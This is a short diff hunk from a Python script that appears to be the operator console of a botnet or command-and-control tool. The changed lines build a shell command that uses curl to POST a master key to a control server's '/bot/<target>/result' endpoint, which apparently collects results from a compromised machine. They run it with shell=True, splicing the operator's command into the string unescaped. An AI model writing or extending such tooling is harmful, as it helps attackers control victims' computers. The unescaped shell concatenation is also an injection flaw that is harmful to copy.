@@ -198,8 +198,8 @@ ___  ___          _              _____                       _
         self.poutput(output_push)
 
         # This "hack" was used due to lack of knowledge of asyncio. Will come back to this... 
-        payload = "sleep " + TIMER + "; echo -e '\n[" + args.target + "] Result:\n=====================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + args.target + "/result"
-        print("[*] payload = ", payload)
+        payload = "sleep " + TIMER + "; echo '\n[" + args.target + "]  $" + args.command + "\n==========================================================\n';  curl -X POST -d 'masterkey'='" + MASTERKEY + "' " + URL + "/bot/" + args.target + "/result"
+        #print("[*] payload = ", payload)
         process = Popen(payload, shell=True)
 
 
